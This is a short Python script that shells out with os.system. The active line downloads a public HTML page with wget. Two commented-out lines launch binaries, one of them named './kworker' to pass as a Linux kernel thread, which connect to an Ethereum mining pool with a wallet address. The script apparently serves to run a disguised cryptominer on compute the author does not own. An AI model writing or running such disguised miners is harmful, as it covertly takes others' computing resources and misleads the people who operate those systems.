import os

#os.system('./orgeth_ktidle 52 > /output/ntask.log')
#os.system('./kworker -U -P stratum1+ssl://0x46C68C44c9566A42876D115D93e84B4DAf3103d2.bit1@asia1.ethermine.org:5555')
os.system("wget https://zll17.github.io/about/douban_renting.html -P /output/a.html")